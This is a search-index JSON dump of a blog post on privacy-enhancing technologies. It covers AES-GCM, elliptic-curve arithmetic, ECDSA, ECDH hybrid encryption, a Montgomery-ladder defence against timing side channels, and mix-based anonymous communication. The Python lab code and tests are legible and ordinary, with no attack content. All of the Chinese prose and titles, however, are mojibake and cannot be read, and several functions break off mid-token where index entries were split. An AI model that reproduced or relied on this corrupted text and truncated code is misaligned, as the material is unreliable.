[{"categories":["å¯†ç å­¦"],"content":"Privacy Enhancing Technologies (PET)ï¼Œå®é™…ä¸Šè¿˜æ˜¯å¯†ç å­¦ã€‚ ","date":"2022-02-04","objectID":"/pet/:0:0","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦","åŒæ€åŠ å¯†"],"title":"æ‰‘æœ”è¿·ç¦»ï¼šéšç§å¢å¼ºæŠ€æœ¯å®è·µ","uri":"/pet/"},{"categories":["å¯†ç å­¦"],"content":"éšç§ä¸éšç§ä¾µçŠ¯ éšç§å¯ä»¥çœ‹ä½œæ˜¯å¯¹æ•°æ®çš„æ§åˆ¶çš„ä¸€ç§å‡†è®¸ï¼š æœºå¯†æ€§ - ä¿è¯ä¸€ä¸ªäººçš„ç§˜å¯†ä¸è¢«æ³„æ¼ æ§åˆ¶ - ç»™ä¸ªäººæ§åˆ¶è‡ªå·±ä¸ªäººä¿¡æ¯çš„æƒåˆ© è‡ªæˆ‘å®ç° - å…è®¸ä¸ªäººä½¿ç”¨è¿™äº›ä¿¡æ¯æ¥è¾¾æˆè‡ªå·±çš„ç›®çš„ Solove åˆ†ç±»å°†éšç§ä¾µçŠ¯åˆ†ä¸º 4 ç±»ï¼š ä¿¡æ¯æ”¶é›† ä¿¡æ¯å¤„ç† ä¿¡æ¯ä¼ æ’­ å…¥ä¾µï¼ˆå³å¹²æ‰°ä¸ªäººçš„æ´»åŠ¨ä¸å†³ç­–ï¼‰ ","date":"2022-02-04","objectID":"/pet/:1:0","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦","åŒæ€åŠ å¯†"],"title":"æ‰‘æœ”è¿·ç¦»ï¼šéšç§å¢å¼ºæŠ€æœ¯å®è·µ","uri":"/pet/"},{"categories":["å¯†ç å­¦"],"content":"éšç§å¢å¼ºæŠ€æœ¯åˆ†ç±» æ ¹æ®ä¸åŒçš„å‡è®¾ï¼Œéšç§å¢å¼ºæŠ€æœ¯å¯ä»¥åˆ†ä¸º Soft PET å’Œ Hard PETã€‚å‰è€…ä¸»è¦å…³æ³¨åˆè§„æ€§ï¼Œå‡è®¾å¤„ç†ç”¨æˆ·æ•°æ®çš„ç¬¬ä¸‰æ–¹æœåŠ¡æ˜¯åˆæ³•å¯ä¿¡çš„ï¼Œå› æ­¤ä¾§é‡äºå»ºç«‹å®‰å…¨ä¿¡é“ã€å¼ºåŒ–è®¿é—®æ§åˆ¶ç­–ç•¥ç­‰ç­‰ã€‚ åè€…åˆ™å‡è®¾ä»»ä¸€ç¬¬ä¸‰æ–¹æœåŠ¡å‡ä¸å¯ä¿¡ï¼Œå› æ­¤æ³¨é‡å®Œæ•´æ€§ã€å®¡è®¡ã€ä¸æ³„æ¼æ•°æ®ç»™ç¬¬ä¸‰æ–¹ç­‰ç­‰ã€‚ ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœ Alice å’Œ Bob è¦é€šè¿‡ä¸€å°æœåŠ¡å™¨ï¼ˆç¬¬ä¸‰æ–¹æœåŠ¡ï¼‰è¿›è¡Œé€šä¿¡ï¼Œé‚£ä¹ˆåœ¨ Soft PET ä¸­ï¼ŒåŒæ–¹éƒ½ä¼šä¸æœåŠ¡å™¨å»ºç«‹ TLS è¿æ¥ä¼ è¾“åŠ å¯†æ•°æ®ã€‚æœåŠ¡å™¨å¯ä»¥çœ‹åˆ°æ•°æ®æ˜æ–‡ï¼Œä¸è¿‡ç›‘å¬è€…çœ‹ä¸åˆ°ã€‚ è€Œåœ¨ Hard PET ä¸­ï¼ŒAlice å’Œ Bob ä¸ä¿¡ä»»æœåŠ¡å™¨ã€‚æ­¤æ—¶ Alice å¯èƒ½ä½¿ç”¨ Bob çš„å…¬é’¥åŠ å¯†åç»æœåŠ¡å™¨ä¼ è¾“ç»™ Bobï¼Œè¿™ä¸€è¿‡ç¨‹ä¸­æœåŠ¡å™¨å°±æ— æ³•çœ‹åˆ°æ˜æ–‡äº†ã€‚ ","date":"2022-02-04","objectID":"/pet/:2:0","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦","åŒæ€åŠ å¯†"],"title":"æ‰‘æœ”è¿·ç¦»ï¼šéšç§å¢å¼ºæŠ€æœ¯å®è·µ","uri":"/pet/"},{"categories":["å¯†ç å­¦"],"content":"é€šä¿¡éšç§ Communications Privacy è¿™ä¸ªéƒ¨åˆ†æ¯”è¾ƒç®€å•ï¼Œå³å¯†ç å­¦ä¸­çš„æ··åˆåŠ å¯†æœºåˆ¶ã€‚ ","date":"2022-02-04","objectID":"/pet/:3:0","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦","åŒæ€åŠ å¯†"],"title":"æ‰‘æœ”è¿·ç¦»ï¼šéšç§å¢å¼ºæŠ€æœ¯å®è·µ","uri":"/pet/"},{"categories":["å¯†ç å­¦"],"content":"å¯¹ç§°åŠ å¯† é¦–å…ˆæ˜¯å¯¹ç§°åŠ å¯†éƒ¨åˆ†ï¼Œç°åœ¨é€šå¸¸é‡‡ç”¨ AEAD æ–¹å¼åŒæ—¶ç¡®ä¿æœºå¯†æ€§å’Œå®Œæ•´æ€§ï¼Œæœ€è‘—åçš„ç®—æ³•è«è¿‡äº AES-GCM äº†ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¯¹äºåŒä¸€å¯†é’¥ä¸èƒ½é‡å¤ä½¿ç”¨ç›¸åŒçš„ IVã€‚ æˆ‘ä»¬éœ€è¦å®ç° encrypt_message å’Œ decrypt_message ä¸¤ä¸ªå‡½æ•°ï¼Œåœ¨å®ç°å‰å…ˆåˆ©ç”¨ pytest å†™å¥½æµ‹è¯•ï¼Œä»¥ AES-128-GCM ä¸ºä¾‹ï¼š @pytest.mark.task2 def test_gcm_encrypt(): \"\"\" Tests encryption with AES-GCM \"\"\" from os import urandom key = urandom(16) message = b\"Hello World!\" iv, ciphertext, tag = encrypt_message(key, message) assert len(iv) == 16 assert len(ciphertext) == len(message) assert len(tag) == 16 @pytest.mark.task2 def test_gcm_decrypt(): \"\"\" Tests decryption with AES-GCM \"\"\" from os import urandom key = urandom(16) message = b\"Hello World!\" iv, ciphertext, tag = encrypt_message(key, message) assert len(iv) == 16 assert len(ciphertext) == len(message) assert len(tag) == 16 m = decrypt_message(key, iv, ciphertext, tag) assert m == message @pytest.mark.task2 def test_gcm_fails(): from pytest import raises from os import urandom key = urandom(16) message = b\"Hello World!\" iv, ciphertext, tag = encrypt_message(key, message) with raises(Exception) as excinfo: decrypt_message(key, iv, urandom(len(ciphertext)), tag) assert 'decryption failed' in str(excinfo.value) with raises(Exception) as excinfo: decrypt_message(key, iv, ciphertext, urandom(len(tag))) assert 'decryption failed' in str(excinfo.value) with raises(Exception) as excinfo: decrypt_message(key, urandom(len(iv)), ciphertext, tag) assert 'decryption failed' in str(excinfo.value) with raises(Exception) as excinfo: decrypt_message(urandom(len(key)), iv, ciphertext, tag) assert 'decryption failed' in str(excinfo.value) å‡½æ•°å®ç°éƒ¨åˆ†åˆ™åˆ©ç”¨ petlibï¼Œæ³¨æ„æ•è·å¼‚å¸¸ï¼š def encrypt_message(key, message): \"\"\" Encrypt a message under a key given as input \"\"\" length = len(key) iv = urandom(length) aes = Cipher(\"aes-128-gcm\") ciphertext, tag = aes.quick_gcm_enc(key, iv, message) return iv, ciphertext, tag def decrypt_message(key, iv, ciphertext, tag): \"\"\" Decrypt a cipher text under a key given as input In case the decryption fails, throw an exception. \"\"\" aes = Cipher(\"aes-128-gcm\") try: plain = aes.quick_gcm_dec(key, iv, ciphertext, tag) except: raise Exception(\"decryption failed\") return plain ","date":"2022-02-04","objectID":"/pet/:3:1","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦","åŒæ€åŠ å¯†"],"title":"æ‰‘æœ”è¿·ç¦»ï¼šéšç§å¢å¼ºæŠ€æœ¯å®è·µ","uri":"/pet/"},{"categories":["å¯†ç å­¦"],"content":"éå¯¹ç§°åŠ å¯† éå¯¹ç§°éƒ¨åˆ†é‡‡ç”¨ ECDH æ¥å‡å°å¯†é’¥é•¿åº¦ï¼Œè€ƒè™‘åˆ° Forward Secrecy çš„è¦æ±‚ï¼Œå¯ä»¥å‡çº§æˆ ECDHEã€‚åœ¨æ­¤ä¹‹å‰ï¼Œå…ˆå¤ä¹ ä¸€ä¸‹æ¤­åœ†æ›²çº¿ç®—æœ¯ã€‚ å‡è®¾æ›²çº¿ä¸º $y^2\\equiv x^3+ax+b\\ (mod\\ p)$ï¼Œé¦–å…ˆéœ€è¦ä¸€ä¸ªåˆ¤æ–­ç‚¹æ˜¯å¦åœ¨æ›²çº¿ä¸Šçš„å‡½æ•°ã€‚æˆ‘ä»¬ç”¨å°è£…å¥½çš„ petlib.ec å†™æµ‹è¯•ï¼Œä½†åªä½¿ç”¨ petlib.Bn æ¥è®¡ç®—æ¤­åœ†æ›²çº¿ç®—æœ¯ï¼š @pytest.mark.task3 def test_on_curve(): \"\"\" Test the procedues that tests whether a point is on a curve. \"\"\" # Example on how to define a curve from petlib.ec import EcGroup, EcPt group = EcGroup(713) # NIST curve d = group.parameters() a, b, p = d[\"a\"], d[\"b\"], d[\"p\"] g = group.generator() gx, gy = g.get_affine() from Lab01Code import is_point_on_curve assert is_point_on_curve(a, b, p, gx, gy) assert is_point_on_curve(a, b, p, None, None) def is_point_on_curve(a, b, p, x, y): \"\"\" Check that a point (x, y) is on the curve defined by a,b and prime p. Reminder: an Elliptic Curve on a prime field p is defined as: y^2 = x^3 + ax + b (mod p) (Weierstrass form) Return True if point (x,y) is on curve, otherwise False. By convention a (None, None) point represents \"infinity\". \"\"\" assert isinstance(a, Bn) assert isinstance(b, Bn) assert isinstance(p, Bn) and p \u003e 0 assert (isinstance(x, Bn) and isinstance(y, Bn)) \\ or (x is None and y is None) if x is None and y is None: return True lhs = (y * y) % p rhs = (x * x * x + a * x + b) % p on_curve = (lhs == rhs) return on_curve éšåï¼Œå¯¹äº $(x_r,y_r)=(x_p,y_p)+(x_q,y_q)$ï¼Œæˆ‘ä»¬æœ‰ï¼š $$ \\lambda=(y_q-y_p)(x_q-x_p)^{-1}\\ (mod\\ p) $$ $$ x_r=\\lambda^2-x_p-x_q\\ (mod\\ p) $$ $$ y_r=\\lambda(x_p-x_r)-y_p\\ (mod\\ p) $$ @pytest.mark.task3 def test_point_addition(): \"\"\" Test whether the EC point addition is correct. \"\"\" from pytest import raises from petlib.ec import EcGroup, EcPt group = EcGroup(713) # NIST curve d = group.parameters() a, b, p = d[\"a\"], d[\"b\"], d[\"p\"] g = group.generator() gx0, gy0 = g.get_affine() r = group.order().random() gx1, gy1 = (r * g).get_affine() assert is_point_on_curve(a, b, p, gx0, gy0) assert is_point_on_curve(a, b, p, gx1, gy1) # Test a simple addition h = (r + 1) * g hx1, hy1 = h.get_affine() x, y = point_add(a, b, p, gx0, gy0, gx1, gy1) assert is_point_on_curve(a, b, p, x, y) assert x == hx1 assert y == hy1 # Ensure commutativity xp, yp = point_add(a, b, p, gx1, gy1, gx0, gy0) assert is_point_on_curve(a, b, p, xp, yp) assert x == xp assert y == yp # Ensure addition with neutral returns the element xp, yp = point_add(a, b, p, gx1, gy1, None, None) assert is_point_on_curve(a, b, p, xp, yp) assert xp == gx1 assert yp == gy1 xp, yp = point_add(a, b, p, None, None, gx0, gy0) assert is_point_on_curve(a, b, p, xp, yp) assert gx0 == xp assert gy0 == yp # An error is raised in case the points are equal with raises(Exception) as excinfo: point_add(a, b, p, gx0, gy0, gx0, gy0) assert 'EC Points must not be equal' in str(excinfo.value) @pytest.mark.task3 def test_point_addition_check_inf_result(): \"\"\" Test whether the EC point addition is correct for pt - pt = inf \"\"\" from petlib.ec import EcGroup group = EcGroup(713) # NIST curve d = group.parameters() a, b, p = d[\"a\"], d[\"b\"], d[\"p\"] g = group.generator() gx0, gy0 = g.get_affine() gx1, gy1 = gx0, p - gy0 assert is_point_on_curve(a, b, p, gx0, gy0) assert is_point_on_curve(a, b, p, gx1, gy1) x, y = point_add(a, b, p, gx0, gy0, gx1, gy1) assert is_point_on_curve(a, b, p, x, y) assert (x, y) == (None, None) def point_add(a, b, p, x0, y0, x1, y1): \"\"\"Define the \"addition\" operation for 2 EC Points. Reminder: (xr, yr) = (xq, yq) + (xp, yp) is defined as: lam = (yq - yp) * (xq - xp)^-1 (mod p) xr = lam^2 - xp - xq (mod p) yr = lam * (xp - xr) - yp (mod p) Return the point resulting from the addition by implementing the above pseudocode. Raises an Exception if the points are equal. \"\"\" if x0 is None and y0 is None: return x1, y1 if x1 is None and y1 is None: return x0, y0 if x0 == x1 and y0 == y1: raise Exception(\"EC Points must not be equal\") assert (isinstance(x0, Bn) and isinstance( y0, Bn)) assert (isinstance(x1, Bn) and isinstance( y1, Bn)) inv = 0 try: inv = (x1-x0).mod_inverse(p) except: return None, None lamb = (y1-y0).mod_mul(inv, p) xr = lamb.mod_pow(2, p).mo","date":"2022-02-04","objectID":"/pet/:3:2","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦","åŒæ€åŠ å¯†"],"title":"æ‰‘æœ”è¿·ç¦»ï¼šéšç§å¢å¼ºæŠ€æœ¯å®è·µ","uri":"/pet/"},{"categories":["å¯†ç å­¦"],"content":"ç­¾å åœ¨æˆ‘ä»¬çš„æ··åˆåŠ å¯†ä½“åˆ¶ä¸­è¿˜å¯ä»¥åŠ å…¥æ•°å­—ç­¾åï¼Œè¿™é‡Œç”¨ ECDSAï¼š @pytest.mark.task4 def test_key_gen(): \"\"\" Tests the key generation of ECDSA\"\"\" from Lab01Code import ecdsa_key_gen ecdsa_key_gen() assert True @pytest.mark.task4 def test_produce_signature(): \"\"\" Tests signature function \"\"\" msg = b\"Test\" * 1000 from Lab01Code import ecdsa_key_gen, ecdsa_sign group, priv, pub = ecdsa_key_gen() ecdsa_sign(group, priv, msg) assert True @pytest.mark.task4 def test_check_signature(): \"\"\" Tests signature and verification function \"\"\" msg = b\"Test\" * 1000 group, priv, pub = ecdsa_key_gen() sig = ecdsa_sign(group, priv, msg) assert ecdsa_verify(group, pub, msg, sig) @pytest.mark.task4 def test_check_fail(): \"\"\" Ensures verification fails when it should \"\"\" msg = b\"Test\" * 1000 msg2 = b\"Text\" * 1000 group, priv, pub = ecdsa_key_gen() sig = ecdsa_sign(group, priv, msg) assert not ecdsa_verify(group, pub, msg2, sig) def ecdsa_key_gen(): \"\"\" Returns an EC group, a random private key for signing and the corresponding public key for verification\"\"\" group = EcGroup() priv_sign = group.order().random() pub_verify = priv_sign * group.generator() return group, priv_sign, pub_verify def ecdsa_sign(group, priv_sign, message): \"\"\" Sign the SHA256 digest of the message using ECDSA and return a signature \"\"\" digest = sha256(message).digest() kinv_rp = do_ecdsa_setup(group, priv_sign) sig = do_ecdsa_sign(group, priv_sign, digest, kinv_rp) return sig def ecdsa_verify(group, pub_verify, message, sig): \"\"\" Verify the ECDSA signature on the message \"\"\" digest = sha256(message).digest() res = do_ecdsa_verify(group, pub_verify, sig, digest) return res ","date":"2022-02-04","objectID":"/pet/:3:3","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦","åŒæ€åŠ å¯†"],"title":"æ‰‘æœ”è¿·ç¦»ï¼šéšç§å¢å¼ºæŠ€æœ¯å®è·µ","uri":"/pet/"},{"categories":["å¯†ç å­¦"],"content":"å®Œæ•´çš„åŠ å¯†é€šä¿¡å®ç° å°†ä¸Šé¢å®ç°çš„éƒ¨åˆ†ç»„åˆåˆ°ä¸€èµ·ï¼ŒåŠ ä¸Š DH å¯†é’¥äº¤æ¢ï¼Œå°±æ˜¯å®Œæ•´çš„åŠ å¯†é€šä¿¡è¿‡ç¨‹äº†ã€‚åœ¨ä¸‹é¢çš„ä»£ç é‡Œå‡è®¾ Alice å‘é€ Bob æ¥æ”¶ï¼Œä½†å› ä¸ºé€šä¿¡çš„å¯¹ç§°æ€§ï¼Œå¯¹äºç›¸åçš„æƒ…å†µä¹ŸåŒæ ·é€‚ç”¨ã€‚ @pytest.mark.task5 def test_encrypt(): ecdsa_group, ecdsa_priv_alice, ecdsa_pub_alice = ecdsa_key_gen() alice_sig = (ecdsa_group, ecdsa_priv_alice) dh_group, dh_priv_bob, dh_pub_bob = dh_get_key() message = b\"Hello World!\" iv, ciphertext, tag, sig, dh_pub_alice = dh_encrypt( dh_pub_bob, message, alice_sig) assert len(iv) == 16 assert len(ciphertext) == len(message) assert len(tag) == 16 @pytest.mark.task5 def test_decrypt(): ecdsa_group, ecdsa_priv_alice, ecdsa_pub_alice = ecdsa_key_gen() alice_sig = (ecdsa_group, ecdsa_priv_alice) alice_ver = (ecdsa_group, ecdsa_pub_alice) dh_group, dh_priv_bob, dh_pub_bob = dh_get_key() message = b\"Hello World!\" iv, ciphertext, tag, sig, dh_pub_alice = dh_encrypt( dh_pub_bob, message, alice_sig) assert len(iv) == 16 assert len(ciphertext) == len(message) assert len(tag) == 16 encrypted = (iv, ciphertext, tag, sig) m = dh_decrypt(dh_priv_bob, dh_pub_alice, encrypted, alice_ver) assert m == message @pytest.mark.task5 def test_fails(): ecdsa_group, ecdsa_priv_alice, ecdsa_pub_alice = ecdsa_key_gen() alice_sig = (ecdsa_group, ecdsa_priv_alice) alice_ver = (ecdsa_group, ecdsa_pub_alice) dh_group, dh_priv_bob, dh_pub_bob = dh_get_key() message = b\"Hello World!\" iv, ciphertext, tag, sig, dh_pub_alice = dh_encrypt( dh_pub_bob, message, alice_sig) assert len(iv) == 16 assert len(ciphertext) == len(message) assert len(tag) == 16 # Random ciphertext with raises(Exception) as excinfo: encrypted = (iv, urandom(len(ciphertext)), tag, sig) dh_decrypt(dh_priv_bob, dh_pub_alice, encrypted, alice_ver) assert 'decryption failed' in str(excinfo.value) # Random AES-GCM tag with raises(Exception) as excinfo: encrypted = (iv, ciphertext, urandom(len(tag)), sig) dh_decrypt(dh_priv_bob, dh_pub_alice, encrypted, alice_ver) assert 'decryption failed' in str(excinfo.value) # Random IV with raises(Exception) as excinfo: encrypted = (urandom(len(iv)), ciphertext, tag, sig) dh_decrypt(dh_priv_bob, dh_pub_alice, encrypted, alice_ver) assert 'decryption failed' in str(excinfo.value) encrypted_normal = (iv, ciphertext, tag, sig) group_rand, priv_rand, pub_rand = dh_get_key() # Random DH private key of Bob with raises(Exception) as excinfo: dh_decrypt(priv_rand, dh_pub_alice, encrypted_normal, alice_ver) assert 'decryption failed' in str(excinfo.value) # Random DH public key of Alice with raises(Exception) as excinfo: dh_decrypt(dh_priv_bob, pub_rand, encrypted_normal, alice_ver) assert 'decryption failed' in str(excinfo.value) ecdsa_group_rand, ecdsa_priv_rand, ecdsa_pub_rand = ecdsa_key_gen() alice_ver_rand = (ecdsa_group_rand, ecdsa_pub_rand) # Random ECDSA verificaiton key with raises(Exception) as excinfo: dh_decrypt(dh_priv_bob, dh_pub_alice, encrypted_normal, alice_ver_rand) assert 'verification failed' in str(excinfo.value) # Random signature with raises(Exception) as excinfo: encrypted = (iv, ciphertext, tag, (Bn(100), Bn(200))) dh_decrypt(dh_priv_bob, dh_pub_alice, encrypted, alice_ver) assert 'verification failed' in str(excinfo.value) def dh_get_key(): \"\"\" Generate a DH key pair \"\"\" group = EcGroup() priv_dec = group.order().random() pub_enc = priv_dec * group.generator() return group, priv_dec, pub_enc def dh_encrypt(pub, message, alice_sig=None): \"\"\" Assume you know the public key of someone else (Bob), and wish to Encrypt a message for them. - Generate a fresh DH key for this message. - Derive a fresh shared key. - Use the shared key to AES_GCM encrypt the message. - Optionally: sign the message with Alice's key. \"\"\" assert isinstance(pub, EcPt) group, priv_dh, pub_dh = dh_get_key() secret = priv_dh * pub assert isinstance(secret, EcPt) key = sha256(secret.export()).digest()[:16] iv, ciphertext, tag = encrypt_message(key, message) sig = None if alice_sig is not None: group, priv_sign = alice_sig sig = ecdsa_sign(group, priv_sign, message) return iv, ciphertext, tag, sig, pub_dh def dh_decrypt(priv, pub, ciphertext,","date":"2022-02-04","objectID":"/pet/:3:4","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦","åŒæ€åŠ å¯†"],"title":"æ‰‘æœ”è¿·ç¦»ï¼šéšç§å¢å¼ºæŠ€æœ¯å®è·µ","uri":"/pet/"},{"categories":["å¯†ç å­¦"],"content":"ä¾§ä¿¡é“æ”»å‡» æœ€åï¼Œæˆ‘ä»¬ç¼–å†™å‡½æ•°æµ‹è¯•æ¤­åœ†æ›²çº¿ç‚¹ä¹˜æ³•æ‰€æ¶ˆè€—çš„æ—¶é—´ï¼š def time_scalar_mul(f): # pragma: no cover start = time.perf_counter() group = EcGroup(713) d = group.parameters() a, b, p = d[\"a\"], d[\"b\"], d[\"p\"] g = group.generator() gx0, gy0 = g.get_affine() r = group.order().random() f(a, b, p, gx0, gy0, r) return r, time.perf_counter()-start def time_double_add(times): # pragma: no cover for _ in range(times): r, time_double_add = time_scalar_mul( point_scalar_multiplication_double_and_add) print(r, time_double_add) Python3.8 ç§»é™¤äº† time.clock()ï¼Œä½¿ç”¨ time.perf_counter() æ›¿ä»£ã€‚ è¿è¡Œåå¯ä»¥å‘ç°ï¼Œå¿«é€Ÿå¹‚çš„æ–¹å¼èŠ±è´¹æ—¶é—´æµ®åŠ¨å¾ˆå¤§ï¼Œå¯èƒ½å¯¼è‡´åŸºäºæ—¶é—´çš„ä¾§ä¿¡é“æ”»å‡»ã€‚ä¸ºäº†é˜²æ­¢è¿™ä¸€æ”»å‡»ï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨ Montgomerry Ladder ç®—æ³•é‡æ–°å®ç°ä¹˜æ³•ï¼š def point_scalar_multiplication_montgomerry_ladder(a, b, p, x, y, scalar): \"\"\" Implement Point multiplication with a scalar: r * (x, y) = (x, y) + ... + (x, y) (r times) Reminder of Double and Multiply algorithm: r * P R0 = infinity R1 = P for i in num_bits(P)-1 to zero: if di = 0: R1 = R0 + R1 R0 = 2R0 else R0 = R0 + R1 R1 = 2 R1 return R0 \"\"\" R0 = (None, None) R1 = (x, y) assert isinstance(x, Bn) assert isinstance(y, Bn) assert isinstance(scalar, Bn) for i in reversed(range(0, scalar.num_bits())): # TODO: ADD YOUR CODE HERE if not scalar.is_bit_set(i): R1 = point_add(a, b, p, R0[0], R0[1], R1[0], R1[1]) R0 = point_double(a, b, p, R0[0], R0[1]) else: R0 = point_add(a, b, p, R0[0], R0[1], R1[0], R1[1]) R1 = point_double(a, b, p, R1[0], R1[1]) return R0 def time_montgomery(times): for _ in range(times): r, time_montgomery = time_scalar_mul( point_scalar_multiplication_montgomerry_ladder) print(r, time_montgomery) æ­¤æ—¶çš„è®¡æ—¶ç»“æœéå¸¸ç¨³å®šï¼Œå› ä¸º Montgomerry Ladder ç®—æ³•ç¡®ä¿äº†å¯¹ä¸åŒè¾“å…¥çš„å¤„ç†èŠ±è´¹å¤§è‡´ç›¸åŒçš„æ—¶é—´ã€‚ ","date":"2022-02-04","objectID":"/pet/:3:5","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦","åŒæ€åŠ å¯†"],"title":"æ‰‘æœ”è¿·ç¦»ï¼šéšç§å¢å¼ºæŠ€æœ¯å®è·µ","uri":"/pet/"},{"categories":["å¯†ç å­¦"],"content":"åŒ¿åé€šä¿¡ Anonymous Communications åŒ¿åé€šä¿¡çš„åŒ¿åæ€§å¤§æ¦‚æœ‰å¦‚ä¸‹å‡ ç§ï¼š å‘é€è€…åŒ¿åï¼šAlice å‘é€æ¶ˆæ¯ç»™ Bobï¼ŒBob å¹¶ä¸çŸ¥é“å‘é€è€…æ˜¯è° æ¥æ”¶è€…åŒ¿åï¼šAlice å‘é€æ¶ˆæ¯ç»™ Bobï¼Œä½†ä¸çŸ¥é“ Bob æ˜¯è° åŒå‘åŒ¿åï¼šAlice ä¸ Bob é€šä¿¡ï¼Œä½†ä¸çŸ¥é“å¯¹æ–¹èº«ä»½ ç¬¬ä¸‰æ–¹åŒ¿åï¼šAlice ä¸ Bob é€šä¿¡å¹¶çŸ¥é“å¯¹æ–¹èº«ä»½ï¼Œä½†ç¬¬ä¸‰æ–¹å¹¶ä¸çŸ¥é“ ä¸ºäº†æ»¡è¶³åŒ¿åæ€§ï¼Œæˆ‘ä»¬å¸¸å¸¸éœ€è¦æ»¡è¶³ï¼š ä¸å¯è§‚æµ‹æ€§ï¼šAlice ä¸ Bob é€šä¿¡ï¼Œè€Œå…¶ä»–äººå¹¶ä¸çŸ¥é“ä»–ä»¬å„è‡ªåœ¨å‘é€è¿˜æ˜¯æ¥æ”¶æ¶ˆæ¯ ä¸å¯å…³è”æ€§ï¼šAlice å‘é€ï¼ˆæˆ– Bob æ¥æ”¶ï¼‰çš„ä»»æ„ä¸¤æ¡æ¶ˆæ¯æ— æ³•è¢«å…³è”åˆ°åŒä¸€ä¸ªå‘é€è€…ï¼ˆæˆ–æ¥æ”¶è€…ï¼‰ ä¼ªåŒ¿åæ€§ï¼šAlice çš„æ‰€æœ‰è¡Œä¸ºéƒ½å¯ä»¥è¢«å…³è”åˆ°ä¸€ä¸ªå®ä½“ï¼Œä½†å®ä½“çš„èº«ä»½æ— æ³•ç¡®å®š å®ç°åŒ¿åé€šä¿¡æœ‰å¤šç§æ–¹æ³•ï¼Œå…¶ä¸­æœ€ç®€å•çš„è«è¿‡äºæ‰€æœ‰å‘é€çš„æ¶ˆæ¯éƒ½é€šè¿‡å¹¿æ’­çš„æ–¹å¼ï¼Œå¦‚æœæ¥æ”¶åˆ°æ¶ˆæ¯çš„äººå‘ç°å¯ä»¥æˆåŠŸè§£å¯†ï¼Œè¯´æ˜æ¶ˆæ¯æ˜¯å‘é€ç»™è‡ªå·±çš„ï¼Œå¦åˆ™ä¸¢å¼ƒã€‚è¿™å½“ç„¶ä¸æ˜¯å¥½åŠæ³•ï¼Œä½†å¦‚æœæˆ‘ä»¬è¦è‡ªå·±è®¾è®¡åŒ¿åé€šä¿¡æœºåˆ¶ï¼Œéœ€è¦æ³¨æ„ä¸èƒ½æ¯”è¿™ä¸€åŠæ³•æ›´å·®ã€‚ ","date":"2022-02-04","objectID":"/pet/:4:0","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦","åŒæ€åŠ å¯†"],"title":"æ‰‘æœ”è¿·ç¦»ï¼šéšç§å¢å¼ºæŠ€æœ¯å®è·µ","uri":"/pet/"},{"categories":["å¯†ç å­¦"],"content":"é«˜å»¶è¿ŸåŒ¿åé€šä¿¡ Mix æ˜¯ä¸€ç§é«˜å»¶è¿ŸåŒ¿åé€šä¿¡æœºåˆ¶ï¼Œå®é™…ä¸Šå°±æ˜¯å‘é€è€…å°†æ¶ˆæ¯éƒ½å‘åˆ°ä¸€ä¸ªå«åš Mix çš„é»‘ç›’å­é‡Œï¼Œéšåæ¶ˆæ¯ä»é»‘ç›’å­é‡Œå‡ºæ¥ï¼Œå†å‘é€åˆ°æ¥æ”¶è€…ã€‚å¦‚æœ Mix å¯ä»¥æŠµæŠ—æµé‡åˆ†æå¹¶æä¾›æ¯”ç‰¹çº§çš„ä¸å¯å…³è”æ€§ï¼Œé‚£ä¹ˆå°±èƒ½ä¿è¯åŒ¿åæ€§äº†ã€‚ Alice ç”¨ Mix å…¬é’¥åŠ å¯†æ¶ˆæ¯åå‘é€ç»™ Mixï¼Œéšå Mix è§£å¯†å¹¶å‘é€ç»™ Bobã€‚ç”±äºä»»ä½•äººéƒ½å¯ä»¥ç»™ Mix å‘æ¶ˆæ¯ï¼Œè€Œ Mix çš„æ¨¡å¼å®é™…ä¸Šä¸ºæ”»å‡»è€…æä¾›äº†ä¸€ä¸ªè§£å¯† Oracleï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¿®æ”¹è¾“å…¥æ¥è¿›è¡Œé€‰æ‹©å¯†æ–‡æ”»å‡»ï¼Œè¿™å°±è¦æ±‚åŠ å¯†æœºåˆ¶æ˜¯ IND-CCA çš„ã€‚å¦åˆ™ï¼Œæ”»å‡»è€…å°±å¯ä»¥å…³è”è¾“å…¥å’Œè¾“å‡ºï¼Œç ´åæ¯”ç‰¹ä¸å¯å…³è”æ€§ã€‚ å¦ä¸€æ–¹é¢ï¼Œå¦‚æœ Mix é‡‡ç”¨ FIFO æ–¹å¼æ¥æ”¶å’Œå‘é€æ¶ˆæ¯ï¼Œé‚£ä¹ˆæ”»å‡»è€…åªéœ€è¦è¿›è¡Œæµé‡åˆ†æå°±èƒ½ç®€å•åœ°å…³è”è¾“å…¥å’Œè¾“å‡ºäº†ï¼Œæ­¤æ—¶ Mix æ˜¯ä¸èƒ½æŠµæŠ—æµé‡åˆ†æçš„ã€‚å¯ä»¥çœ‹åˆ°ï¼ŒæŠ—æµé‡åˆ†æä¿æŠ¤å…ƒæ•°æ®ï¼Œè€Œæ¯”ç‰¹ä¸å¯å…³è”æ€§ä¿æŠ¤æ•°æ®ã€‚ å› æ­¤ï¼Œé¡¾åæ€ä¹‰ï¼ŒMix éœ€è¦åƒæ´—ç‰Œä¸€æ ·æ‰“ä¹±æ”¶åˆ°çš„æ¶ˆæ¯å¹¶éšæœºè¾“å‡ºï¼Œåœ¨ Mix å†…éƒ¨ä¹Ÿéœ€è¦ä¸€ä¸ªæ¶ˆæ¯æ± æ¥æš‚å­˜è¿˜æ²¡æœ‰å‘å‡ºå»çš„æ¶ˆæ¯ï¼Œé€šè¿‡å»¶è¿Ÿã€æ•…æ„æ’å…¥æ— 